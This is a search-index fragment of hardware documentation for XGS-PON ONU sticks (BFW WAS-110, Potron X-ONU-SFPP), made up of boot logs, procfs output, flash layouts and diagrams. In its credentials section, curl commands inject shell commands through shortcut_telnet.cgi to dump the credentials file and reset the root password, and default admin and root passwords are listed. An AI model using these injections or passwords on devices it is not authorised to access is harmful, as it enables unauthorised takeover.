grx500wdt 12000000.watchdog: [grx500wdt_probe]Not WDT reset.\n[    6.608184] grx500wdt 12000000.watchdog: [grx500wdt_probe]:[554] grx500_wdt = 70824178\n[    6.616428] grx500wdt 12000000.watchdog: H/w Watchdog Timer: (max 10) (nowayout= 0)\n[    6.624857] cpu cpu0: dev_pm_opp_of_get_sharing_cpus: Couldn't find opp node.\n[    6.633024] init netlink module\n[    6.636436] NET: Registered protocol family 10\n[    6.647006] NET: Registered protocol family 17\n[    6.650312] 8021q: 802.1Q VLAN Support v1.8\n[    6.665953] ubi0: attaching mtd6\n[    8.255143] ubi0: scanning is finished\n[    8.287306] ubi0: attached mtd6 (name \"system_sw\", size 102 MiB)\n[    8.292018] ubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\n[    8.298769] ubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\n[    8.305534] ubi0: VID header offset: 2048 (aligned 2048), data offset: 4096\n[    8.312477] ubi0: good PEBs: 816, bad PEBs: 0, corrupted PEBs: 0\n[    8.318468] ubi0: user volume: 7, internal volumes: 1, max. volumes count: 128\n[    8.325674] ubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 0\n[    8.334007] ubi0: available PEBs: 440, total reserved PEBs: 376, PEBs reserved for bad PEB handling: 20\n[    8.344110] ubi0: background thread \"ubi_bgt0d\" started, PID 455\n[    8.356495] Gluebi: mtd 'rootfsA' set to be root filesystem\n[    8.360834] rootdev: 0x01f0000b, mtd block: 0000001f, mtd index: 0000000b\n[    8.402103] VFS: Mounted root (squashfs filesystem) readonly on device 31:11.\n[    8.414008] Freeing unused kernel: 1284k freed\n[    8.417014] This architecture does not have kernel memory protection.\n[    9.242044] init: Console is alive\n[    9.244397] init: - watchdog -\n[   10.744331] kmodloader: loading kernel modules from /etc/modules-boot.d/*\n[   10.807669] kmodloader: done loading kernel modules from /etc/modules-boot.d/*\n[   10.817637] init: - preinit -\n[   12.249891] random: procd: uninitialized urandom read (4 bytes read)\nVolume ID 6, size 265 LEBs (33648640 bytes, 32.0 MiB), LEB size 126976 bytes (124.0 KiB), dynamic, name \"rootfs_data\", alignment 1\n[   12.720492] random: jshn: uninitialized urandom read (4 bytes read)\n[   12.915650] random: jshn: uninitialized urandom read (4 bytes read)\nls: /lib/modules/4.9.308+/ltq_atm*: No such file or directory\nPress the [f] key and hit [enter] to enter failsafe mode\nPress the [1], [2], [3] or [4] key and hit [enter] to select the debug level\n[   16.535357] UBIFS (ubi0:6): default file-system created\n[   16.545419] UBIFS (ubi0:6): background thread \"ubifs_bgt0_6\" started, PID 575\n[   16.735500] UBIFS (ubi0:6): UBIFS: mounted UBI device 0, volume 6, name \"rootfs_data\"\n[   16.741994] UBIFS (ubi0:6): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes\n[   16.751823] UBIFS (ubi0:6): FS size: 32378880 bytes (30 MiB, 255 LEBs), journal size 1650688 bytes (1 MiB, 13 LEBs)\n[   16.762233] UBIFS (ubi0:6): reserved for root: 1529334 bytes (1493 KiB)\n[   16.768838] UBIFS (ubi0:6): media format: w4/r0 (latest is w4/r0), UUID FFCF3C93-8005-4374-BE0E-C7B04DC15AA2, small LPT model\n[   16.790641] mount_root: overlay filesystem has not been fully initialized yet\n[   16.797390] mount_root: switching to ubifs overlay\n[   16.842201] urandom-seed: Seed file not found (/etc/urandom.seed)\n&gt;&gt;&gt;&gt;&gt; Mounting /ptconf partition &lt;&lt;&lt;&lt;&lt;\nUBI=0\n[   17.192079] UBIFS (ubi0:7): background thread \"ubifs_bgt0_7\" started, PID 585\n[   17.316381] UBIFS (ubi0:7): recovery needed\n[   17.585241] UBIFS (ubi0:7): recovery completed\n[   17.588416] UBIFS (ubi0:7): UBIFS: mounted UBI device 0, volume 7, name \"ptconf\"\n[   17.595676] UBIFS (ubi0:7): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes\n[   17.605556] UBIFS (ubi0:7): FS size: 4825088 bytes (4 MiB, 38 LEBs), journal size 1015809 bytes (0 MiB, 6 LEBs)\n[   17.615618] UBIFS (ubi0:7): reserved for root: 227900 bytes (222 KiB)\n[   17.622051] UBIFS (ubi0:7): media format: w4/r0 (latest is w4/r0), UUID 90134634-9CC8-426E-A46D-346D602B08AD, small LPT model\n&gt;&gt;&gt;&gt;&gt; Mounting /ptdata partition &lt;&lt;&lt;&lt;&lt;\nMTD=7\n[   17.808266] ubi2: attaching mtd7\n[   17.905339] ubi2: scanning is finished\n[   17.933583] ubi2: attached mtd7 (name \"ptdata\", size 6 MiB)\n[   17.937819] ubi2: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\n[   17.944612] ubi2: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\n[   17.951382] ubi2: VID header offset: 2048 (aligned 2048), data offset: 4096\n[   17.958323] ubi2: good PEBs: 48, bad PEBs: 0, corrupted PEBs: 0\n[   17.964225] ubi2: user volume: 1, internal volumes: 1, max. volumes count: 128\n[   17.971436] ubi2: max/mean erase counter: 3/1, WL threshold: 4096, image sequence number: 191176628\n[   17.980460] ubi2: available PEBs: 0, total reserved PEBs: 48, PEBs reserved for bad PEB handling: 20\n[   17.991553] ubi2: background thread \"ubi_bgt2d\" started, PID 592\n&gt;&gt;&gt;&gt;&gt; Mounting ptdata partition as UBIFS &lt;&lt;&lt;&lt;&lt;\nUBI=2\nPTDATA_NAME=ptdata\n[   18.119620] UBIFS (ubi2:0): background thread \"ubifs_bgt2_0\" started, PID 610\n[   18.408431] UBIFS (ubi2:0): UBIFS: mounted UBI device 2, volume 0, name \"ptdata\"\n[   18.414494] UBIFS (ubi2:0): LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes\n[   18.424322] UBIFS (ubi2:0): FS size: 1904640 bytes (1 MiB, 15 LEBs), journal size 888833 bytes (0 MiB, 5 LEBs)\n[   18.434299] UBIFS (ubi2:0): reserved for root: 89960 bytes (87 KiB)\n[   18.440556] UBIFS (ubi2:0): media format: w4/r0 (latest is w4/r0), UUID 0D6691F3-65A7-4542-8792-9AE400DEAF37, small LPT model\n/ptconf is not empty\n[   18.607879] procd: - early -\n[   18.609723] procd: - watchdog -\n[   19.459362] procd: - watchdog -\n[   19.461703] procd: - ubus -\n[   19.560403] urandom_read: 3 callbacks suppressed\n[   19.560419] random: ubusd: uninitialized urandom read (4 bytes read)\n[   19.570568] random: ubusd: uninitialized urandom read (4 bytes read)\n[   19.576437] random: ubusd: uninitialized urandom read (4 bytes read)\n[   19.584304] procd: - init -\nPlease press Enter to activate this console.\n[   20.343068] kmodloader: loading kernel modules from /etc/modules.d/*\n[   20.391981] [PP_NAD]:__net_adapter_init:58: start: 1\n[   20.482075] [PP_QOS_FW]:do_load_firmware:318: FW [v 1.16.0] is running soc rev 1)\n[   20.488889] [PP_DEV]:pp_dev_late_init:676: PP is ready!\n[   20.556867] dp_pre_init done\n[   20.705296] mod_sfp_i2c-ACA_FW: ACA FW Hdr V2: version=0x0018, SOC=0x1 (soc_step_B), Chip=0x2 (chip_falcon), Built=0x0 (built_rel), FW=0x1 )\n[   20.717186] pon-sfp-i2c 14050000.sfp_i2c: FW interface version 0x04000000\n[   20.898603] ip6_tables: (C) 2000-2006 Netfilter Core Team\n[   20.922792] i2c /dev entries driver\n[   20.932533] i2c-gpio i2c-gpio: using pins 507 (SDA) and 506 (SCL)\n[   20.943009] GACT probability on\n[   20.947390] Mirror/redirect action on\n[   20.969751] u32 classifier\n[   20.971028]     input device check on\n[   20.974715]     Actions configured\n[   21.031795] Ebtables v2.0 registered\n[   21.038915] ip_tables: (C) 2000-2006 Netfilter Core Team\n[   21.105620] nf_conntrack version 0.5.0 (16384 buckets, 65536 max)\n[   21.315105] xt_time: kernel timezone is -0000\n[   21.401703] Property intel,extra-subif for if eth0_0 4\n[   21.424489] xrx500_of_iface: rx csum offload is enabled !\n[   21.452301] Lantiq ethernet driver for XRX500 init.\n[   21.617820] kmodloader: done loading kernel modules from /etc/modules.d/*\nMIPS: set unaligned_action to 'SHOW'\nfactory_mode:0\nsync A0 table success\nsync A2 table success\nStart status monitoring for I2C EEPROM[0]@0x50 EEPROM[1]@0x51\n[optic-db] Looking for '/etc/optic-db/ecinetworks-enxgsfppomacv2-V1.0-prx126-sfp-pon' configuration\n[optic-db] Looking for '/etc/optic-db/ecinetworks-enxgsfppomacv2-prx126-sfp-pon' configuration\n[optic-db] Looking for '/etc/optic-db/ecinetworks-enxgsfppomacv2-V1.0' configuration\n[optic-db] Looking for '/etc/optic-db/ecinetworks-enxgsfppomacv2' configuration\n[optic-db] Looking for '/etc/optic-db/default' configuration\n[optic-db] Applied '/etc/optic-db/default' configuration\n[serdes-db] Looking for '/etc/serdes-db/prx126-sfp-pon-ecinetworks-enxgsfppomacv2-V1.0.conf' configuration\n[serdes-db] Looking for '/etc/serdes-db/prx126-sfp-pon-ecinetworks-enxgsfppomacv2.conf' configuration\n[serdes-db] Looking for '/etc/serdes-db/prx126-sfp-pon.conf' configuration\n[serdes-db] Applied '/etc/serdes-db/prx126-sfp-pon.conf' configuration\n[   37.256222] UBIFS (ubi2:0): background thread \"ubifs_bgt2_0\" stops\n[   37.393727] gpio_probe enter: 45\n[   37.395578] gpio_probe enter: 52 out gpio_num=2\n[   37.400186] gpio_probe enter: 68 gpiod_direction_output [0]\n[   37.405669] gpio_probe enter: 68 gpiod_direction_output [1]\n[   37.411190] gpio_probe enter: 76 in gpio_num=-2\n[   37.415990] ptdrv gpio adp  init\n[   37.419097] ptdrv gpio init\n[   37.439325] in pon_dev_init\n[   37.440799] out pon_dev_init\n[   37.457982] pt_gpon_drv: no symbol version for log_print\n[   37.462808] [PON]&lt;Info&gt;, line[464], pon_krl_port_fun_register_init:pon_krl_port_fun_register_init\n[   37.470826] [PON]&lt;Error&gt;, line[83], pon_driver_init:s_pon_user_init:0,s_pon_tx_power_on:0\n[   37.470826] \nset_bootcmd_env:48 pt_env_fw_read \nset_bootcmd_env:50 buf=run ubi_init;ubi remove rootfs_data;run flash_flash \nset_bootcmd_env:51 buf, strlen=51 \nset_bootcmd_env:54 buf,last char=0x68 \nset_bootcmd_env:56 PRECONFIG_CONF_BOOTCMD_ENV=run ubi_init;ubi remove rootfs_data;run flash_flash \nset_bootcmd_env:57 PRECONFIG_[   39.186021] random: fast init done\nCONF_BOOTCMD_ENV, strlen=51 \nset_bootcmd_env:60 new_buf= \"run ubi_init;ubi remove rootfs_data;run flash_flash\" \nset_bootcmd_env:66 bootcmd is default! \nset_bootcmd_env:67 go on! \n[   39.955597] pon_mbox 18100000.ponmbox: abort write because mailbox is in reset\np408 omci main start\n[omcid] Use OMCC version 0xa3\n[omcid] Use LCT port UNI1\n[   45.150158] get mesg from user, pid = 2242\n[   46.341421] pon_mbox: FW version: 3.21.0.3.14-1669214605\n[   47.193701] [PON]&lt;Info&gt;, line[165], pon_krl_set_dynm_link_detc:In\n[   47.193701] \n[   47.200060] [PON]&lt;Info&gt;, line[173], pon_krl_set_dynm_link_detc:dynamic link detection enable:1\n[   47.200060] \n[   49.436988] gpio_ioctl:51 gpio.pin=24, gpio.data=0\n[   49.505580] pon_mbox 18100000.ponmbox: cannot send FW multicast netlink msg: -3\n[   49.511546] pon_mbox 18100000.ponmbox: cannot send netlink response: ret: -3\n[   49.518591] pon_mbox 18100000.ponmbox: cannot send FW multicast netlink msg: -3\n[   49.525815] pon_mbox 18100000.ponmbox: cannot send netlink response: ret: -3\n[   49.532886] pon_mbox 18100000.ponmbox: cannot send FW multicast netlink msg: -3\n[   49.540136] pon_mbox 18100000.ponmbox: cannot send netlink response: ret: -3\n</code></pre>"},{"location":"xgs-pon/ont/bfw-solutions/was-110/#procfs","title":"procfs <sup>3</sup>","text":"/proc/cmdline/proc/cpuinfo/proc/meminfo/proc/mtd <pre><code>ubi.mtd=system_sw,2048 rootfsname=rootfsA rootfstype=squashfs ip=192.168.1.1:192.168.1.2:192.162.1.1:255.255.255.0::eth0:on earlycon=lantiq,0x16380000 console=ttyLTQ0,115200 ethaddr=00:E0:92:00:01:40 machtype=PRX126_SFP_PON mtdparts=nand.0:1m(uboot),256k(ubootconfigA),256k(ubootconfigB),256k(gphyfirmware),1m(calibration),16m(bootcore),102m(system_sw),6m(ptdata),-(res) cpuclk=400000000 rst_cause=POR_RESET mem=1024M@512M\n</code></pre> <pre><code>system type     : PRX300 rev 1.2\nmachine         : PRX126-SFP-PON\nprocessor       : 0\ncpu model       : MIPS interAptiv (multi) V2.0\nBogoMIPS        : 265.98\nwait instruction    : yes\nmicrosecond timers  : yes\ntlb_entries     : 32\nextra interrupt vector  : yes\nhardware watchpoint : yes, count: 4, address/irw mask: [0x0ffc, 0x0ffc, 0x0ffb, 0x0ffb]\nisa         : mips1 mips2 mips32r1 mips32r2\nASEs implemented    : dsp mt eva\nOptions implemented : tlb tlbinv segments 4kex 4k_cache prefetch mcheck ejtag llsc pindexed_dcache userlocal vint perf_cntr_intr_bit cdmm nan_legacy nan_2008 ebase_wg perf\nshadow register sets    : 1\nkscratch registers  : 0\npackage         : 0\ncore            : 0\nVPE         : 0\nVCED exceptions     : not available\nVCEI exceptions     : not available\n</code></pre> <pre><code>MemTotal:         996604 kB\nMemFree:          411108 kB\nMemAvailable:     398692 kB\nBuffers:            5692 kB\nCached:            21804 kB\nSwapCached:            0 kB\nActive:            15020 kB\nInactive:          16152 kB\nActive(anon):       3676 kB\nInactive(anon):        0 kB\nActive(file):      11344 kB\nInactive(file):    16152 kB\nUnevictable:           0 kB\nMlocked:               0 kB\nSwapTotal:             0 kB\nSwapFree:              0 kB\nDirty:                 0 kB\nWriteback:             0 kB\nAnonPages:          3696 kB\nMapped:             8452 kB\nShmem:                 0 kB\nSlab:              10432 kB\nSReclaimable:       2592 kB\nSUnreclaim:         7840 kB\nKernelStack:         832 kB\nPageTables:          292 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:      498300 kB\nCommitted_AS:      10536 kB\nVmallocTotal:     524280 kB\nVmallocUsed:           0 kB\nVmallocChunk:          0 kB\nCmaTotal:         573440 kB\nCmaFree:           46404 kB\n</code></pre> <pre><code>dev:    size   erasesize  name\nmtd0: 00100000 00020000 \"uboot\"\nmtd1: 00040000 00020000 \"ubootconfigA\"\nmtd2: 00040000 00020000 \"ubootconfigB\"\nmtd3: 00040000 00020000 \"gphyfirmware\"\nmtd4: 00100000 00020000 \"calibration\"\nmtd5: 01000000 00020000 \"bootcore\"\nmtd6: 06600000 00020000 \"system_sw\"\nmtd7: 00600000 00020000 \"ptdata\"\nmtd8: 00140000 00020000 \"res\"\nmtd9: 0024d000 0001f000 \"kernelA\"\nmtd10: 00554000 0001f000 \"bootcoreA\"\nmtd11: 00ac7000 0001f000 \"rootfsA\"\nmtd12: 0022b510 0001f000 \"kernelB\"\nmtd13: 005b1000 0001f000 \"bootcoreB\"\nmtd14: 01322000 0001f000 \"rootfsB\"\nmtd15: 005d0000 0001f000 \"ptconf\"\nmtd16: 02017000 0001f000 \"rootfs_data\"\n</code></pre>"},{"location":"xgs-pon/ont/bfw-solutions/was-110/#mtds","title":"MTDs <sup>5</sup> <sup>6</sup> <sup>7</sup>","text":"<pre><code>block-beta\n    block:BOOT\n        columns 1\n        mtd0(\"&lt;b&gt;uboot&lt;/b&gt;\\n/dev/mtd0\")\n        mtd1(\"&lt;b&gt;ubootconfigA&lt;/b&gt;\\n/dev/mtd1\")\n        mtd2(\"&lt;b&gt;ubootconfigB&lt;/b&gt;\\n/dev/mtd2\")\n    end\n    block:UBI(\"/dev/ubi0\")\n        columns 2\n        block A\n            columns 1\n            mtd9(\"&lt;b&gt;kernelA&lt;/b&gt;\\n/dev/mtd9\")\n            mtd10(\"&lt;b&gt;bootcoreA&lt;/b&gt;\\n/dev/mtd10\")\n            mtd11(\"&lt;b&gt;rootfsA&lt;/b&gt;\\n/dev/mtd11\")\n        end\n        block B\n            columns 1\n            mtd12(\"&lt;b&gt;kernelB&lt;/b&gt;\\n/dev/mtd12\")\n            mtd13(\"&lt;b&gt;bootcoreB&lt;/b&gt;\\n/dev/mtd13\")\n            mtd14(\"&lt;b&gt;rootfsB&lt;/b&gt;\\n/dev/mtd14\")\n        end\n        block:PERSIST:2\n            columns 1\n            mtd15(\"&lt;b&gt;ptconf&lt;/b&gt;\\n/dev/mtd15\")\n            mtd16(\"&lt;b&gt;rootsfs_data&lt;/b&gt;\\n/dev/mtd16\")\n        end\n    end\n    classDef transparentBlock fill:transparent,stroke:transparent;\n    classDef boldTitle fill:transparent,stroke:transparent,font-weight:bold;\n    class BOOT,PERSIST transparentBlock\n    class A,B boldTitle</code></pre>"},{"location":"xgs-pon/ont/bfw-solutions/was-110/#default-credentials","title":"Default Credentials","text":""},{"location":"xgs-pon/ont/bfw-solutions/was-110/#web-credentials","title":"Web credentials","text":"<p>The default web credentials can be found in <code>/ptrom/ptconf/param_ct.xml</code>. Modifications from the web UI are stored in <code>/ptrom/ptconf/usrconfig_conf</code> as base64 encoded strings.</p> <p>Warning</p> <p>Passwords have a maximum length of 16 characters which are not restricted by the web UI.</p> Exploit to disclose the default web credentials <p>To dump the web credentials from <code>/ptrom/ptconf/param_ct.xml</code>, navigate to:</p> <p>http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml</p> <p>Alternatively, run the following command(s) to download <code>param_ct.xml</code> to a temporary directory.</p>  Windows macOS Linux <pre><code>dir %Temp% &amp;&amp; curl -O \"http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml\"\n</code></pre> <p>The following commands assume Homebrew is installed</p> <pre><code>brew install curl\ncd /tmp &amp;&amp; curl -O \"http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml\"\n</code></pre> <p>The following commands assume Debian or derivatives<sup>4</sup></p> <pre><code>sudo apt-get install curl\ncd /tmp &amp;&amp; curl -O \"http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml\"\n</code></pre> Firmware v1.0.21Firmware &lt;= v1.0.20 Username Password admin BR#22729%635e9 user user1234 Username Password admin QsCg@7249#5281 user user1234"},{"location":"xgs-pon/ont/bfw-solutions/was-110/#shell-credentials","title":"Shell credentials","text":"Firmware v1.0.21Firmware &lt;= v1.0.20 <p>The root password is undisclosed at this time, use the suggested exploit below to gain root privileges.</p> Username Password root QpZm@4246#5753 Exploit to temporarily change the root password <p>Run the following command(s) to temporarily change the root password to <code>root</code>.</p>  Windows macOS Linux <pre><code>curl -s -o null \"http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root\"\n</code></pre> <p>The following commands assume Homebrew is installed</p> <pre><code>brew install curl\ncurl -s -o /dev/null \"http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root\"\n</code></pre> <p>The following commands assume Debian or derivatives<sup>4</sup></p> <pre><code>sudo apt-get install curl\ncurl -s -o /dev/null \"http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root\"\n</code></pre>"},{"location":"xgs-pon/ont/bfw-solutions/was-110/#value-added-resellers","title":"Value-Added Resellers","text":"Company Product Number E-commerce Firmware Ascent Optics XSPU-P9T9R-NxCM PTXG (Potron) Azores Networks XSS BFW/Azores DZS 5311XP E.C.I. Networks EN-XGSFPP-OMAC-V2 BFW/Azores FiberMall XGSPON-ONU-STICK BFW/Azores HALNy Networks HLX-SFPX Flytec Computers <ol> <li> <p>https://www.bfw-solutions.com/en/gpon-family-141 \u21a9</p> </li> <li> <p>https://www.maxlinear.com/product/access/fiber-access/socs-for-optical-networking-units-onu/prx126 \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/Procfs \u21a9</p> </li> <li> <p>https://www.debian.org/derivatives/ \u21a9\u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/Memory_Technology_Device \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/UBIFS \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/SquashFS \u21a9</p> </li> </ol>"},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/","title":"X-ONU-SFPP (SFP+ XGSPON ONU Stick)","text":""},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#architecture","title":"Architecture","text":""},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#maxlinear-prx126","title":"MaxLinear PRX126 <sup>2</sup>","text":"<pre><code>%%{ init: { 'flowchart': { 'htmlLabels': false, 'curve': 'stepBefore' } } }%%\nflowchart LR\n    Z[\" \"] &lt;--Fiber --&gt;\n    A(BOSA)\n    B(\"DRIVER/\n    LA\n    (PMD)\")\n    A --&gt; B\n    B --&gt; A\n    subgraph SOC\n        C(\"SERDES\n        /CDR\")\n        subgraph MAC\n            D(\"10G(E)PON\n            PCS&amp;MAC/\n            TC\") ~~~\n            E(\"10G-\n            Ethernet\n            PCS&amp;MAC\")\n        end\n        C &lt;--&gt; MAC\n        F(\"Network\n        Processsor\n        /Package\n        Switch\")\n        MAC &lt;--&gt; F\n        G(\"10G-\n        Ethernet\n        PCS&amp;\n        MAC\")\n        F &lt;--&gt; G &lt;--&gt;\n        H(\"SERDES\n        /CDR\")\n        I(\"XO/PLL\") ~~~\n        J(\"Multi-Core Processor/Subsystem Controller\")\n    end\n    B &lt;--&gt; C\n    Y[\" \"]\n    Y -- SFI/XFI --&gt; H\n    H --&gt; Y\n    J &lt;-- I2C --&gt; X[\" \"]\n    SOC ~~~\n    K(\"Crystal 40Mhz\") ~~~\n    L(\"SLC NAND Flash\") ~~~\n    M(\"LPDDR3\")\n    style SOC fill:transparent,stroke:limegreen,stroke-width:2px,color:#fff,stroke-dasharray: 10 5\n    style MAC fill:PapayaWhip,stroke:SandyBrown,color:transparent,stroke-width:2px\n    classDef SEA fill:LightSkyBlue,font-weight:bold,stroke:DodgerBlue,stroke-width:2px\n    classDef CORAL fill:PapayaWhip,font-weight:bold,stroke:SandyBrown,stroke-width:2px\n    classDef CLEAR fill:transparent,stroke:transparent,color:transparent\n    class A,C,F,G,I,J,K,H,L,M SEA\n    class B,D,E,G CORAL\n    class Z,Y,X CLEAR</code></pre>"},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#system-information","title":"System Information","text":""},{"location":"xgs-pon/ont/potron-technology/x-onu-sfpp/#boot-log","title":"Boot log","text":"<pre><code>ROM VER: 2.1.0\nCFG 0d\nB\nDdrOk\n\n\nU-Boot 2016.07-MXL-v-3.1.261 (Apr 10 2023 - 10:00:42 +0000), Build: prx126-eva-qspi-nand\n\ninterAptiv\ncps cpu/ddr run in 400/400 Mhz\n       Watchdog enabled\nDRAM:  256 MiB\nNAND:  device found, Manufacturer ID: 0xef, Chip ID: 0xaa\n128 MiB\nBad block table found at page 65472, version 0x01\nBad block table found at page 65408, version 0x01\nIn:    serial\nOut:   serial\nErr:   serial\nReset cause: POR RESET\nNet:   lan-0 config to 1G_XAUI_MODE, lan-1 config to 10G_KR_MODE, prx300-eth\n\nrun flash_flash to bring up the kernel\n\nHit enter to stop autoboot:  0\nubi0: attaching mtd1\nubi0: scanning is finished\nubi0: attached mtd1 (name \"mtd=6\", size 108 MiB)\nubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\nubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\nubi0: VID header offset: 2048 (aligned 2048), data offset: 4096\nubi0: good PEBs: 859, bad PEBs: 5, corrupted PEBs: 0\nubi0: user volume: 8, internal volumes: 1, max. volumes count: 128\nubi0: max/mean erase counter: 7/4, WL threshold: 4096, image sequence number: 0\nubi0: available PEBs: 256, total reserved PEBs: 603, PEBs reserved for bad PEB handling: 15\nRemove UBI volume rootfs_data (id 6)\nCommitted image: A\nubi0: detaching mtd1\nubi0: mtd1 is detached\nubi0: attaching mtd1\nubi0: scanning is finished\nubi0: attached mtd1 (name \"mtd=6\", size 108 MiB)\nubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\nubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\nubi0: VID header offset: 2048 (aligned 2048), data offset: 4096\nubi0: good PEBs: 859, bad PEBs: 5, corrupted PEBs: 0\nubi0: user volume: 7, internal volumes: 1, max. volumes count: 128\nubi0: max/mean erase counter: 7/4, WL threshold: 4096, image sequence number: 0\nubi0: available PEBs: 521, total reserved PEBs: 338, PEBs reserved for bad PEB handling: 15\nRead 0 bytes from volume bootcoreA to a0400000\nNo size specified -&gt; Using max size (5586944)\nRead 0 bytes from volume kernelA to 82000000\nNo size specified -&gt; Using max size (2285568)\n## Booting kernel from Legacy Image at 82000000 ...\n   Image Name:   PON_1.18.1\n   Created:      2023-10-13   2:12:27 UTC\n   Image Type:   MIPS Linux Kernel Image (lzma compressed)\n   Data Size:    2274512 Bytes = 2.2 MiB\n   Load Address: a0020000\n   Entry Point:  a0020000\n   Verifying Checksum ... OK\n   Uncompressing Kernel Image ... OK\n[    0.000000] Linux version 4.9.308+ (flaming.he@ptrd01) (gcc version 8.3.0 (OpenWrt GCC 8.3.0 v19.07.8_maxlinear) ) #0 SMP Wed Mar 15 17:03:01 UTC 2023\n[    0.000000] SoC: PRX300 rev 1.1\n[    0.000000] CPU0 revision is: 0001a120 (MIPS interAptiv (multi))\n[    0.000000] Enhanced Virtual Addressing (EVA 1GB) activated\n[    0.000000] MIPS: machine is PRX126-SFP-PON\n[    0.000000] Coherence Manager IOCU detected\n[    0.000000] Hardware DMA cache coherency disabled\n[    0.000000] earlycon: lantiq0 at MMIO 0x16380000 (options '')\n[    0.000000] bootconsole [lantiq0] enabled\n[    0.000000] User-defined physical RAM map:\n[    0.000000]  memory: 40000000 @ 20000000 (usable)\n[    0.000000] Reserved memory: created CMA memory pool at 0x2d000000, size 48 MiB\n[    0.000000] OF: reserved mem: initialized node linux,cma@0x2D000000, compatible id shared-dma-pool\n[    0.000000] Reserved memory: created CMA memory pool at 0x40000000, size 512 MiB\n[    0.000000] OF: reserved mem: initialized node bm_pool@40000000, compatible id shared-dma-pool\n[    0.000000] Determined physical RAM map:\n[    0.000000]  memory: 40000000 @ 20000000 (usable)\n[    0.000000]  memory: 00007f83 @ 20762630 (reserved)\n[    0.000000]  memory: 22000000 @ 3e000000 (reserved)\n[    0.000000]  memory: 03000000 @ 2d000000 (reserved)\n[    0.000000] Initrd not found or empty - disabling initrd\n[    0.000000] SMPCMP: CPU0: cmp_smp_setup\n[    0.000000] VPE topology {2,2} total 4\n[    0.000000] Detected 3 available secondary CPU(s)\n[    0.000000] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.\n[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes\n[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.\n[    0.000000] Zone ranges:\n[    0.000000]   DMA      [mem 0x0000000020000000-0x000000002fffffff]\n[    0.000000]   Normal   [mem 0x0000000030000000-0x000000005fffffff]\n[    0.000000] Movable zone start for each node\n[    0.000000] Early memory node ranges\n[    0.000000]   node   0: [mem 0x0000000020000000-0x000000005fffffff]\n[    0.000000] Initmem setup node 0 [mem 0x0000000020000000-0x000000005fffffff]\n[    0.000000] percpu: Embedded 12 pages/cpu s17968 r8192 d22992 u49152\n[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 260096\n[    0.000000] Kernel command line: ubi.mtd=system_sw,2048 rootfsname=rootfsA rootfstype=squashfs ip=192.168.1.1:192.168.1.2:192.162.1.1:255.255.255.0::eth0:on earlycon=lantiq,0x16380000 console=ttyLTQ0,115200 ethaddr=00:E0:92:00:01:40 machtype=PRX126_SFP_EVA_PON mtdparts=nand.0:1m(uboot),256k(ubootconfigA),256k(ubootconfigB),256k(gphyfirmware),1m(calibration),16m(bootcore),108m(system_sw),-(res) cpuclk=400000000 rst_cause=POR_RESET mem=1024M@512M \n[    0.000000] PID hash table entries: 4096 (order: 2, 16384 bytes)\n[    0.000000] Dentry cache hash table entries: 131072 (order: 7, 524288 bytes)\n[    0.000000] Inode-cache hash table entries: 65536 (order: 6, 262144 bytes)\n[    0.000000] Writing ErrCtl register=00000000\n[    0.000000] Readback ErrCtl register=00000000\n[    0.000000] Memory: 423928K/1048576K available (5507K kernel code, 295K rwdata, 1384K rodata, 1308K init, 468K bss, 51208K reserved, 573440K cma-reserved)\n[    0.000000] SLUB: HWalign=32, Order=0-3, MinObjects=0, CPUs=4, Nodes=1\n[    0.000000] Hierarchical RCU implementation.\n[    0.000000] NR_IRQS:527\n[    0.000000] EIC is off\n[    0.000000] VINT is on\n[    0.000000] CPU Clock: 400000000Hz  mips_hpt_frequency 200000000Hz\n[    0.000000] clocksource: GIC: mask: 0xffffffffffffffff max_cycles: 0x5c4093a7d1, max_idle_ns: 440795210635 ns\n[    0.000017] sched_clock: 64 bits at 400MHz, resolution 2ns, wraps every 4398046511103ns\n[    0.008519] Calibrating delay loop... 265.98 BogoMIPS (lpj=531968)\n[    0.045342] pid_max: default: 32768 minimum: 301\n[    0.050392] Mount-cache hash table entries: 2048 (order: 1, 8192 bytes)\n[    0.056577] Mountpoint-cache hash table entries: 2048 (order: 1, 8192 bytes)\n[    0.065401] CCA is coherent, 